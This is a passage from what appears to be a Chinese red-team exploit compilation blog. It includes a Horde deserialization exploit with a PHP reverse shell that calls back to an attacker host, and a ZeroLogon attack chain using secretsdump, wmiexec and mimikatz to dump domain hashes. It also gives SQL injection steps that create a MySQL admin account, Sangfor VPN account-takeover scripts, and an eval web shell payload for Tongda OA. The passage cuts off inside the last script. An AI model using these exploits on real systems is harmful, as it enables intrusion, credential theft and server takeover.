&#x3D;&#x3D;&#x3D; 0)&#123;</span><br><span class="line">        $o &#x3D; &quot;NULL&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    return $o;</span><br><span class="line">&#125;</span><br><span class="line">$nofuncs&#x3D;&#39;no exec functions&#39;;</span><br><span class="line">$s&#x3D;@fsockopen(&quot;tcp:&#x2F;&#x2F;$ipaddr&quot;,$port);</span><br><span class="line">while($c&#x3D;fread($s,2048))&#123;</span><br><span class="line">    $out &#x3D; &#39;&#39;;</span><br><span class="line">    if(substr($c,0,3) &#x3D;&#x3D; &#39;cd &#39;)&#123;</span><br><span class="line">        chdir(substr($c,3,-1));</span><br><span class="line">    &#125;else if (substr($c,0,4) &#x3D;&#x3D; &#39;quit&#39; || substr($c,0,4) &#x3D;&#x3D; &#39;exit&#39;) &#123;</span><br><span class="line">        break;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $out&#x3D;PtdSlhY(substr($c,0,-1));</span><br><span class="line">        if($out&#x3D;&#x3D;&#x3D;false)&#123;</span><br><span class="line">            fwrite($s, $nofuncs);</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fwrite($s,$out);</span><br><span class="line">&#125;</span><br><span class="line">fclose($s);&quot;&quot;&quot; % (cbh, cbp)</span><br><span class="line"></span><br><span class="line">def get_session(t, p, usr, pwd):</span><br><span class="line">    uri &#x3D; &quot;http:&#x2F;&#x2F;%s%slogin.php&quot; % (t, p)</span><br><span class="line">    p &#x3D; &#123;</span><br><span class="line">        &quot;login_post&quot; : 1337,</span><br><span class="line">        &quot;horde_user&quot; : usr,</span><br><span class="line">        &quot;horde_pass&quot; : pwd</span><br><span class="line">    &#125;</span><br><span class="line">    r &#x3D; requests.post(uri, data&#x3D;p, allow_redirects&#x3D;False)</span><br><span class="line">    match &#x3D; re.findall(&quot;Horde&#x3D;(.&#123;26&#125;);&quot;, r.headers[&#39;set-cookie&#39;])</span><br><span class="line">    assert len(match) &#x3D;&#x3D; 2, &quot;(-) failed to login&quot;</span><br><span class="line">    return match[1]</span><br><span class="line"></span><br><span class="line">def trigger_deserialization(t, p, s, host, port):</span><br><span class="line">    &quot;&quot;&quot; Object instantiation to reach the deserialization &quot;&quot;&quot;</span><br><span class="line">    handlerthr &#x3D; Thread(target&#x3D;handler, args&#x3D;(port,))</span><br><span class="line">    handlerthr.start()</span><br><span class="line">    uri &#x3D; &quot;http:&#x2F;&#x2F;%s%sservices&#x2F;ajax.php&#x2F;imp&#x2F;imple&quot; % (t, p)</span><br><span class="line">    p &#x3D; &#123;</span><br><span class="line">        &quot;imple&quot; : &quot;IMP_Prefs_Sort&quot;,</span><br><span class="line">        &quot;app&quot; : &quot;imp&quot;,</span><br><span class="line">    &#125;</span><br><span class="line">    h &#x3D; &#123; &quot;cmd&quot; : base64.b64encode(rs(host, port).encode()) &#125;</span><br><span class="line">    c &#x3D; &#123; &quot;Horde&quot; : s &#125;</span><br><span class="line">    r &#x3D; requests.get(uri, params&#x3D;p, cookies&#x3D;c, headers&#x3D;h)</span><br><span class="line">    match &#x3D; re.search(&quot;horde_logout_token&#x3D;(.*)&amp;&quot;, r.text)</span><br><span class="line">    assert match, &quot;(-) failed to leak the horde_logout_token!&quot;</span><br><span class="line">    p[&#39;token&#39;] &#x3D; match.group(1)</span><br><span class="line">    r &#x3D; requests.get(uri, params&#x3D;p, cookies&#x3D;c, headers&#x3D;h)</span><br><span class="line">    assert r.status_code &#x3D;&#x3D; 200, &quot;(-) failed to trigger deserialization!&quot;</span><br><span class="line"></span><br><span class="line">def get_pop():</span><br><span class="line">    &quot;&quot;&quot; An updated pop chain &quot;&quot;&quot;</span><br><span class="line">    pop  &#x3D; &#39;O:34:&quot;Horde_Kolab_Server_Decorator_Clean&quot;:2:&#123;&#39;</span><br><span class="line">    pop +&#x3D; &#39;S:43:&quot;\\00Horde_Kolab_Server_Decorator_Clean\\00_server&quot;;O:20:&quot;Horde_Prefs_Identity&quot;:3:&#123;&#39;</span><br><span class="line">    pop +&#x3D; &#39;S:9:&quot;\\00*\\00_prefs&quot;;O:11:&quot;Horde_Prefs&quot;:2:&#123;&#39;</span><br><span class="line">    pop +&#x3D; &#39;S:8:&quot;\\00*\\00_opts&quot;;a:1:&#123;&#39;</span><br><span class="line">    pop +&#x3D; &#39;s:12:&quot;sizecallback&quot;;a:2:&#123;i:0;O:12:&quot;Horde_Config&quot;:1:&#123;&#39;</span><br><span class="line">    pop +&#x3D; &#39;S:13:&quot;\\00*\\00_oldConfig&quot;;s:44:&quot;eval(base64_decode($_SERVER[HTTP_CMD]));die;&quot;;&#39;</span><br><span class="line">    pop +&#x3D; &#39;&#125;i:1;s:13:&quot;readXMLConfig&quot;;&#125;&#125;&#39;</span><br><span class="line">    pop +&#x3D; &#39;S:10:&quot;\\00*\\00_scopes&quot;;a:1:&#123;&#39;</span><br><span class="line">    pop +&#x3D; &#39;s:5:&quot;horde&quot;;C:17:&quot;Horde_Prefs_Scope&quot;:10:&#123;[null,[1]]&#125;&#125;&#125;&#39;  # implements Serializable using custom unserialize&#x2F;serialize</span><br><span class="line">    pop +&#x3D; &#39;S:13:&quot;\\00*\\00_prefnames&quot;;a:1:&#123;s:10:&quot;identities&quot;;i:0;&#125;&#39;</span><br><span class="line">    pop +&#x3D; &#39;S:14:&quot;\\00*\\00_identities&quot;;a:1:&#123;i:0;i:0;&#125;&#125;&#39;             # additional checks</span><br><span class="line">    pop +&#x3D; &#39;S:42:&quot;\\00Horde_Kolab_Server_Decorator_Clean\\00_added&quot;;a:1:&#123;i:0;i:0;&#125;&#125;&#39;</span><br><span class="line">    return pop</span><br><span class="line"></span><br><span class="line">def get_patch():</span><br><span class="line">    &quot;&quot;&quot; Our original array &quot;&quot;&quot;</span><br><span class="line">    patch  &#x3D; &#39;a:1:&#123;&#39;</span><br><span class="line">    patch +&#x3D; &#39;s:5:&quot;INBOX&quot;;a:1:&#123;&#39;</span><br><span class="line">    patch +&#x3D; &#39;s:1:&quot;b&quot;;i:6;&#39;</span><br><span class="line">    patch +&#x3D; &#39;&#125;&#125;&#39;</span><br><span class="line">    return patch</span><br><span class="line"></span><br><span class="line">def set_pref(t, p, s, k, o):</span><br><span class="line">    &quot;&quot;&quot; A primitive that inserts a string into the database &quot;&quot;&quot;</span><br><span class="line">    uri &#x3D; &quot;http:&#x2F;&#x2F;%s%sservices&#x2F;ajax.php&#x2F;imp&#x2F;setPrefValue&quot; % (t, p)</span><br><span class="line">    p &#x3D; &#123;</span><br><span class="line">        &quot;pref&quot; : k,</span><br><span class="line">        &quot;value&quot; : o,</span><br><span class="line">    &#125;</span><br><span class="line">    c &#x3D; &#123; &quot;Horde&quot; : s &#125;</span><br><span class="line">    r &#x3D; requests.get(uri, params&#x3D;p, cookies&#x3D;c)</span><br><span class="line">    match &#x3D; re.search(&quot;horde_logout_token&#x3D;(.*)&amp;&quot;, r.text)</span><br><span class="line">    assert match, &quot;(-) failed to leak the horde_logout_token!&quot;</span><br><span class="line">    p[&#39;token&#39;] &#x3D; match.group(1)</span><br><span class="line">    r &#x3D; requests.get(uri, params&#x3D;p, cookies&#x3D;c)</span><br><span class="line">    assert (&quot;\&quot;response\&quot;:true&quot; in r.text and r.status_code &#x3D;&#x3D; 200), &quot;(-) failed to set the preference!&quot;</span><br><span class="line"></span><br><span class="line">def handler(lport):</span><br><span class="line">    print(&quot;(+) starting handler on port %d&quot; % lport)</span><br><span class="line">    t &#x3D; telnetlib.Telnet()</span><br><span class="line">    s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.bind((&quot;0.0.0.0&quot;, lport))</span><br><span class="line">    s.listen(1)</span><br><span class="line">    conn, addr &#x3D; s.accept()</span><br><span class="line">    print(&quot;(+) connection from %s&quot; % addr[0])</span><br><span class="line">    t.sock &#x3D; conn</span><br><span class="line">    print(&quot;(+) pop thy shell!&quot;)</span><br><span class="line">    t.interact()</span><br><span class="line"></span><br><span class="line">def fix_path(p):</span><br><span class="line">    if p &#x3D;&#x3D; &quot;&#x2F;&quot;:</span><br><span class="line">        return p</span><br><span class="line">    if not p.startswith(&quot;&#x2F;&quot;):</span><br><span class="line">        p &#x3D; &quot;&#x2F;%s&quot; % p</span><br><span class="line">    if not p.endswith(&quot;&#x2F;&quot;):</span><br><span class="line">        p &#x3D; &quot;%s&#x2F;&quot; % p</span><br><span class="line">    return p</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    if len(sys.argv) &lt; 5:</span><br><span class="line">        print(&quot;(+) usage %s &lt;target&gt; &lt;path&gt; &lt;user:pass&gt; &lt;connectback:port&gt;&quot; % sys.argv[0])</span><br><span class="line">        print(&quot;(+) eg: %s 172.16.175.148 &#x2F;horde&#x2F; hordeuser:pass123 172.16.175.1:1337&quot; % sys.argv[0])</span><br><span class="line">        sys.exit(0)</span><br><span class="line">    target &#x3D; sys.argv[1]</span><br><span class="line">    path   &#x3D; fix_path(sys.argv[2])</span><br><span class="line">    user   &#x3D; sys.argv[3].split(&quot;:&quot;)[0]</span><br><span class="line">    pswd   &#x3D; sys.argv[3].split(&quot;:&quot;)[1]</span><br><span class="line">    host   &#x3D; sys.argv[4].split(&quot;:&quot;)[0]</span><br><span class="line">    port   &#x3D; int(sys.argv[4].split(&quot;:&quot;)[1])</span><br><span class="line">    print(&quot;(+) targeting http:&#x2F;&#x2F;%s%s&quot; % (target, path))</span><br><span class="line">    session &#x3D; get_session(target, path, user, pswd)</span><br><span class="line">    print(&quot;(+) obtained session %s&quot; % session)</span><br><span class="line">    set_pref(target, path, session, &#39;sortpref&#39;, get_pop())</span><br><span class="line">    print(&quot;(+) inserted our php object&quot;)</span><br><span class="line">    print(&quot;(+) triggering deserialization...&quot;)</span><br><span class="line">    trigger_deserialization(target, path, session, host, port)</span><br><span class="line">    set_pref(target, path, session, &#39;sortpref&#39;, get_patch())</span><br><span class="line">    print(&quot;(+) repaired the target!&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">saturn:~$.&#x2F;poc.py 172.16.175.148&#x2F;horde&#x2F; hordeuser:pass123 172.16.175.145 (+) targeting http:&#x2F;&#x2F;172.16.175.145&#x2F;horde&#x2F;</span><br><span class="line">(+) obtained session iefankvohbl8og0mtaadm3efb6 (+) inserted our php object</span><br><span class="line">(+) triggering deserialization... (+) starting handler on port 1337</span><br><span class="line">(+) connection from 172.16.175.145 (+) pop thy shell!</span><br><span class="line">id</span><br><span class="line">uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data) pwd</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;horde&#x2F;services</span><br></pre></td></tr></table></figure><h2 id="通达OA任意用户登录"><a href="#通达OA任意用户登录" class="headerlink" title="通达OA任意用户登录"></a>通达OA任意用户登录</h2><p>1、首先访问 /ispirit/login_code.php 获取 codeuid。</p><p>2、访问 /general/login_code_scan.php 提交 post 参数：</p><p>uid=1&amp;codeuid={9E908086-342B-2A87-B0E9-E573E226302A}<br><img src="/image/HW/46.jpg" alt="1"></p><p>3、最后访问 /ispirit/login_code_check.php?codeuid=xxx</p><p>这样 $_SESSION 里就有了登录的信息了。</p><h2 id="通达OA-v11-7-后台SQL注入"><a href="#通达OA-v11-7-后台SQL注入" class="headerlink" title="通达OA v11.7 后台SQL注入"></a>通达OA v11.7 后台SQL注入</h2><p>利用条件:需要登录权限,文章作者给出了利用链注入加mysql权限,又是写木马的。</p><p>/general/hr/manage/query/delete_cascade.php?condition_cascade= select%20if((substr(user(),1,1)=%27r%27),1,power(9999,99))</p><p>1、添加一个mysql用户</p><p>grant all privileges ON mysql.* TO ‘ateam666’@’%’ IDENTIFIED BY ‘abcABC@123’ WITH GRANT OPTION<br><img src="/image/HW/47.jpg" alt="1"></p><p>2、给创建的ateam666账户添加mysql权限。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE &#96;mysql&#96;.&#96;user&#96; SET &#96;Password&#96; &#x3D; &#39;*DE0742FA79F6754E99FDB9C8D2911226A5A9051D&#39;, &#96;Select_priv&#96; &#x3D; &#39;Y&#39;, &#96;Insert_priv&#96; &#x3D; &#39;Y&#39;, &#96;Up</span><br></pre></td></tr></table></figure><p>3、刷新数据库就可以登录到数据库啦。</p><p><code>/general/hr/manage/query/delete_cascade.php?condition_cascade=flush privileges;</code></p><p>4、通达OA配置mysql默认是不开启外网访问的所以需要修改mysql授权登录。</p><p><code>/general/hr/manage/query/delete_cascade.php?condition_cascade=</code></p><p><code>grant all privileges ON mysql.* TO &#39;ateam666&#39;@&#39;%&#39; IDENTIFIED BY &#39;abcABC@123&#39; WITH GRANT OPTION</code></p><p>5、接下来就是考验mysql提权功底的时候啦 233…</p><p>来源:<a href="https://mp.weixin.qq.com/s/8rvIT1y_odN2obJ1yAvLbw">https://mp.weixin.qq.com/s/8rvIT1y_odN2obJ1yAvLbw</a></p><h2 id="Wordpress-File-manager插件任意文件上传"><a href="#Wordpress-File-manager插件任意文件上传" class="headerlink" title="Wordpress File-manager插件任意文件上传"></a>Wordpress File-manager插件任意文件上传</h2><p>相信大家对Wordpress并不陌生;File-manager插件也是相当火爆前段时间爆出任意文件上传漏洞。<br><img src="/image/HW/48.jpg" alt="1"><br>成功上传后文件访问路径<br><code>/wordpress/wp-content/plugins/wp-file-manager/lib/files/shell.php</code><br>参考:<a href="https://www.anquanke.com/post/id/216990">https://www.anquanke.com/post/id/216990</a></p><h2 id="Pligg-CMS远程代码执行-CVE-2020-25287"><a href="#Pligg-CMS远程代码执行-CVE-2020-25287" class="headerlink" title="Pligg CMS远程代码执行[CVE-2020-25287]"></a>Pligg CMS远程代码执行[CVE-2020-25287]</h2><p>漏洞非常鸡肋需要登录后台、受影响Pligg2.0.3版本。<br><img src="/image/HW/49.jpg" alt="1"><br>1、模版编辑器功能可以编辑任意文件内容,在文件中加入恶意代码导致代码执行。<br>参考：<a href="https://github.com/jenaye/pligg">https://github.com/jenaye/pligg</a><br><img src="/image/HW/50.jpg" alt="1"></p><h2 id="ZeroLogon接管域控权限漏洞-CVE-2020-1472"><a href="#ZeroLogon接管域控权限漏洞-CVE-2020-1472" class="headerlink" title="ZeroLogon接管域控权限漏洞[CVE-2020-1472]"></a>ZeroLogon接管域控权限漏洞[CVE-2020-1472]</h2><p>1.组件概述</p><p>Netlogon远程协议是一个远程过程调用（RPC）接口，用于基于域的网络上的用户和计算机身份验证。Netlogon远程协议RPC接口还用于为备份域控制器（BDC）复制数据库。</p><p>Netlogon远程协议用于维护从域成员到域控制器（DC），域的DC之间以及跨域的DC之间的域关系。此RPC接口用于发现和管理这些关系。</p><p>2.漏洞介绍</p><p>该漏洞主要是由于在使用Netlogon安全通道与域控进行连接时，由于认证协议加密部分的缺陷，导致攻击者可以将域控管理员用户的密码置为空，从而进一步实现密码hash获取并最终获得管理员权限。成功的利用可以实现以管理员权限登录域控设备，并进一步控制整个域。</p><p>3.漏洞影响</p><p>• Microsoft Windows Server 2008 R2 SP1</p><p>• Microsoft Windows Server 2012</p><p>• Microsoft Windows Server 2012 R2</p><p>• Microsoft Windows Server 2016</p><p>• Microsoft Windows Server 2019</p><p>• Microsoft Windows Server version 2004 (Server Core Installation)</p><p>• Microsoft Windows Server version 1903 (Server Core Installation)</p><p>• Microsoft Windows Server version 1909 (Server Core Installation)</p><p>4.解决方案</p><p><a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1472">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1472</a></p><p><strong>5.**</strong>漏洞复现**</p><p>攻击主机：kali</p><p>受害者主机名：owa.rootkit.org(window2008）                                                  1.使用Impacket库验证Zerologon（CVE-2020-1472）Python脚本（<a href="https://github.com/SecuraBV/CVE-2020-1472%EF%BC%89">https://github.com/SecuraBV/CVE-2020-1472）</a> 将尝试执行Netlogon身份验证绕过。成功执行完后时，脚本将立即终止，并且不执行任何Netlogon操作</p><p>需要Python 3.7以上版本以及pip </p><p>pip install -r requirements.txt</p><p>前提条件需要用到Impacket库</p><p><a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p><p>python3 setup.py install //安装impacket</p><p>运行脚本:</p><p>执行的脚本目标名称可以是主DC或辅助DC。给定EXAMPLE-DC的主机名以及DC的IP：</p><p><code>./zerologon_tester.py EXAMPLE-DC DC的IP</code></p><p><code>./zerologon_tester.py OWA 192.168.1.104</code></p><p>如果存在漏洞，会返回信息：Success! DC can be fully compromised by a Zerologon attack</p><p>2.使用cve-2020-1472-exploit.py进行攻击（测试域控制器是否容易受到Zerologon攻击。当受到攻击时，将DC帐户密码重置为空字符串） 前提条件需要用到Impacket库：</p><p><a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p><p><code>git clone https://github.com/SecureAuthCorp/impacket.git</code><br><code>python3 setup.py install</code> //安装impacket</p><p>执行脚本</p><p><a href="https://github.com/dirkjanm/CVE-2020-1472">https://github.com/dirkjanm/CVE-2020-1472</a></p><p><code>python3 cve-2020-1472-exploit.py owa 192.168.1.104</code></p><p>如果利用漏洞成功，则会提示：vulnerable, changing account password to empty string</p><p>3、使用impacket的secretsdump.py远程导出域控制上的hash</p><p><code>python3 secretsdump.py rootkit.org/owa\$@192.168.1.104 -no-pass</code></p><p>4、利用获取到的管理员hash,通过impacket的wmiexec.py来远程操作域控服务器,获取域控的终端命令窗口<br><code>python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13cf6cfe1f2fc41cd286c7c8caec978b</code> <code>rootkit.org/administrator@192.168.1.104</code></p><p>5、获取管理员hash，远程连接导出sam数据库中的原来的计算机hash<br><code>reg save HKLM\SYSTEM system.save</code></p><p><code>reg save HKLM\SAM sam.save</code></p><p><code>reg save HKLM\security security.save get system.save</code></p><p><code>get sam.save</code></p><p><code>get security.save</code></p><p><code>python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL del /f system.save</code></p><p><code>del /f sam.save del /f security.save</code></p><p>注意：这里会获得一个账号名为：$MACHINE:ACC账号的hash值，注意hash的后半</p><p>6、恢复计算机的hash</p><p>下载脚本 <a href="https://github.com/risksense/zerologon">https://github.com/risksense/zerologon</a></p><p><code>python3 reinstall_original_pw.py owa 192.168.1.104 ad611ebf4fd2de9448a33ba693b212f4</code>   //注意hash的部分，只有后半部分</p><p>如果还原密码成功则会显示：Success! DC machine account should be restored to it&#39;s original value. You might want to secretsdump again to check</p><p>7、恢复计算机的hash</p><p>使用impacket的脚本来登录域控来验证hash</p><p><code>python3 secretsdump.py rootkit.org/administrator:Password1@192.168.1.104 -just-dc-user owa\$</code></p><p>使用7步骤的脚本回复hash前</p><p><code>python3 reinstall_original_pw.py owa 192.168.1.104 ad611ebf4fd2de9448a33ba693b212f4</code>   //注意hash的部分，只有后半部分<br><code>python restorepassword.py rootkit.org/administrator@192.168.1.104 -target-ip 192.168.1.104 -hexpass aad3b435b51404eeaad3b435b51404ee:13cf6cfe1f2fc41cd286c7c8caec978b</code></p><p>通过mimikatz中CVE-2020-1472功能攻击ActiveDirectory的三步骤：</p><p>#lsadump::dcsync /domain:LAB.LOCAL /dc:dc.lab.local /user:krbtg t /authuser:dc$  /authdomain:LAB  /authpassword:””  /authntlm<br>#lsadump::zerologon /target:dc.lab.local                   /account:dc$</p><p>#lsadump::zerologon /target:dc.lab.local                   /account:dc$ /exploit </p><p>#lsadump::dcsync</p><p>#lsadump::postzerologon /target:dc.lab.local   /account:dc$           #恢复密码</p><p>snort检测规则：</p><p>alert tcp any any -&gt; any ![139,445] (msg:”Possible Mimikatz Zerologon Attempt”; flow:established,to_server; content:”|00|”; offse</p><p>Windows事件管理器自查：</p><p>在未打补丁的域控，重点查看windows事件管理器中，eventid为4742或者4624，5805<br><img src="/image/HW/51.jpg" alt="1"><br>在Windows 8月更新中，新增事件ID 5829，5827，5828，5830，5831。蓝队可以重点关注这几个事件ID以方便自查<br>1.当在初始部署阶段允许存在突破的Netlogon安全通道连接时，将生成事件ID 5829。<br>2.管理员可以监控事件ID 5827和5828，这些事件ID在存在漏洞的Netlogon连接被拒绝时触发<br>3.5830，5831如果“域控制器：允许易受攻击的Netlogon安全通道连接”组策略允许连接。<br>mimikatz通过zerologon攻击成功后，将会留下事件id为4648。<br>参考文献：<br><a href="https://mp.weixin.qq.com/s/xq6gwgomkE0ru3lR3EmDaw">https://mp.weixin.qq.com/s/xq6gwgomkE0ru3lR3EmDaw</a></p><h2 id="ThinkAdminV6-任意文件操作"><a href="#ThinkAdminV6-任意文件操作" class="headerlink" title="ThinkAdminV6 任意文件操作"></a>ThinkAdminV6 任意文件操作</h2><p>Update.php 三个函数未校验访问权限</p><p>1、目录遍历注意POST数据包rules参数值需要URL编码</p><p><code>POST /admin.html?s=admin/api.Update/node rules=%5B%22.%2F%22%5D</code></p><p><img src="/image/HW/52.jpg" alt="1"><br>2、文件读取,后面那一串是UTF8字符串加密后的结果。计算方式在Update.php中的加密函数。<br><code>/admin.html?s=admin/api.Update/get/encode/ 34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b2r33322u2x2v1b2s2p382p2q2p372t0y342w34</code><br><img src="/image/HW/53.jpg" alt="1"></p><h2 id="CVE-2020-1181：SharePoint远程代码执行"><a href="#CVE-2020-1181：SharePoint远程代码执行" class="headerlink" title="CVE-2020-1181：SharePoint远程代码执行"></a>CVE-2020-1181：SharePoint远程代码执行</h2><p>在演示场景中，我们使用的版本为替代配置的<code>Microsoft SharePoint 2019 Server</code>，安装在<code>Windows Server 2019 Datacenter</code>系统上。服务器主机称为<code>sp2019.contoso.lab</code>，已加入contoso.lab域中，域控制器为一台独立的虚拟机。目标主机已安装终止2020年2月份的所有补丁，因此对应的版本号为<code>16.0.10355.20000</code>。</p><p>攻击系统中只需要使用支持的Web浏览器即可。如下图所示，我们使用的浏览器为Mozilla Firefox 69.0.3。我们将使用与前文类似的</p><p>WikiContentWebpart，将其命名为WikiContentRCE.xml。<br>1.首先我们访问SharePoint Server，以普通用户（user2）通过身份认证:<br><img src="/image/HW/54.jpg" alt="1"><br><img src="/image/HW/55.jpg" alt="1"><br>2.接下来创建站点，使该用户变成该站点所有者（所有者），具有所有权限。（前提条件普通用户具有创建站点的权限） 点击顶部面板的“ SharePoint”区域：<br><img src="/image/HW/56.jpg" alt="1"><br>然后点击“ +创建网站 ”链接:<br><img src="/image/HW/57.jpg" alt="1"><br>选择“ Team Site ”。现在我们需要为新站点设置名称，这里我们设置为testsiteofuser2。<br><img src="/image/HW/58.jpg" alt="1"><br>点击“ 完成 ”，成功创建新站点:<br><img src="/image/HW/59.jpg" alt="1"><br>现在点击“ Pages ”链接：<br><img src="/image/HW/60.jpg" alt="1"><br>我们需要切换到“ Classic View ”，单击左下角的“ Return to classic SharePoint ”链接即可：<br><img src="/image/HW/61.jpg" alt="1"><br>点击“ + New ”，为新页面设置一个名称。这里我们设置为newpage1：<br><img src="/image/HW/62.jpg" alt="1"><br>点击“ 创建 ”按钮确认。<br><img src="/image/HW/63.jpg" alt="1"><br>现在我们需要在“ INSERT ”标签页中选择“ Web Part ”：<br><img src="/image/HW/64.jpg" alt="1"><br>在上方窗口中，选择左下角的“ Upload Web Part ”链接，上传我们构造的WikiContentRCE.xml文件：<br><img src="/image/HW/65.jpg" alt="1"><br>点击上传。我们可能会看到一个警告弹窗：“确认离开页面？您输入的数据可能不会被保存”。此时点击“ 离开页面 ”按钮即可，返回主编辑视图：<br><img src="/image/HW/66.jpg" alt="1"><br>我们需要再次在INSERT标签页中选择Web部件小部件，其中将出现我们引入的Web部件：<br><img src="/image/HW/67.jpg" alt="1"><br>在点击添加按钮之前，我们先转到目标SharePoint服务器，打开C:\windows\temp目录：<br><img src="/image/HW/68.jpg" alt="1"><br>此时该目录中不存在RCE_PoC.txt文件。<br>现在我们转到攻击者主机，将我们引入的Web Part添加到页面中：<br><img src="/image/HW/69.jpg" alt="1"><br>再次在目标服务器上检查C:\windows\temp目录：<br><img src="/image/HW/70.jpg" alt="1"><br>通过这种方法，攻击者可以执行任意系统命令，入侵服务器。攻击者只需要在WikiContentRCE.xml文件中，将echo pwned &gt; c:/windows/temp/RCE_PoC.txt串联替换成所需的命令即可。</p><h2 id="深信服SSL-VPN任意密码重置"><a href="#深信服SSL-VPN任意密码重置" class="headerlink" title="深信服SSL VPN任意密码重置"></a>深信服SSL VPN任意密码重置</h2><p>深信服VPN加密算法使用了默认的key,攻击者构利用key构造重置密码数据包从而修改任意用户的密码利用:需要登录账号</p><p>M7.6.6R1版本默认key为20181118</p><p>M7.6.1版本默认key为20100720 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">sangfor_key.py</span><br><span class="line"></span><br><span class="line">from Crypto.Clipher import ARC4 from binascii import a2b_hex</span><br><span class="line"></span><br><span class="line">def myRC4(data,key): rc41&#x3D;ARC4.new(key) encrypted&#x3D;rc41.encrypt(data) return encrypted.encode(&#39;hex&#39;)</span><br><span class="line"></span><br><span class="line">def rc4_decrpt_hex(data,key): rc41&#x3D;ARC4.new(key)</span><br><span class="line"></span><br><span class="line">return rc41.decrypt(a2b_hex(data))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key&#x3D;&#39;20200720&#39;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">data&#x3D;r&#39;,username&#x3D;TARGET_USERNAME,ip&#x3D;127.0.0.1,grpid&#x3D;1,pripsw&#x3D;suiyi,newpsw&#x3D;TARGET_PASSWORD,&#39; print myRC4(data,key)</span><br></pre></td></tr></table></figure><p><img src="/image/HW/71.jpg" alt="1"><br><code>https://&lt;PATH&gt;/por/changepwd.csp(post)</code></p><p><br><code>sessReq=clusterd&amp;sessid=0&amp;str=RC4_STR&amp;len=RC4_STR&amp;len=(脚本计算后结果)</code></br><br><img src="/image/HW/72.jpg" alt="1"></p><h2 id="深信服SSL-VPN修改任意账户手机号"><a href="#深信服SSL-VPN修改任意账户手机号" class="headerlink" title="深信服SSL VPN修改任意账户手机号"></a>深信服SSL VPN修改任意账户手机号</h2><p>修改手机号接口未正确鉴权导致越权覆盖任意用户的手机号码</p><p>利用:需要登录账号</p><p><code>https://&lt;PATH&gt;/por/changetelnum.csp?apiversion=1</code> </p><p><code>newtel=TARGET_PHONE&amp;sessReq=clusterd&amp;username=TARGET_USERNAME&amp;grpid=0&amp;sessid=0&amp;ip=127.0.0.1</code></p><p><img src="/image/HW/73.jpg" alt="1"></p><h2 id="通达OA-v11-6版本RCE漏洞"><a href="#通达OA-v11-6版本RCE漏洞" class="headerlink" title="通达OA v11.6版本RCE漏洞"></a>通达OA v11.6版本RCE漏洞</h2><p>一、影响版本</p><p>11.6 </p><p>二、</p><p>复现过程</p><p><a href="http://www.kxdw.com/soft/23114.html">1.下载11.6版本oa，下载地址：http://www.kxdw.com/soft/23114.html</a> </p><p>2.安装<br><img src="/image/HW/74.jpg" alt="1"><br><img src="/image/HW/75.jpg" alt="1"><br><img src="/image/HW/76.jpg" alt="1"><br>3.exp脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">target&#x3D;&quot;http:&#x2F;&#x2F;ip:port&#x2F;&quot;   &#x2F;&#x2F;此处填写上面安装oa的ip及端口</span><br><span class="line">payload&#x3D;&quot;&lt;?php eval($_POST[&#39;hahaha&#39;]);?&gt;&quot;</span><br><span class="line"></span><br><span class="line">print(&quot;[*]Warning,This exploit code will DELETE auth.inc.php which may damage the OA&quot;) </span><br><span class="line">input(&quot;Press enter to continue&quot;)</span><br><span class="line"></span><br><span class="line">print(&quot;[*]Deleting auth.inc.php....&quot;)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span 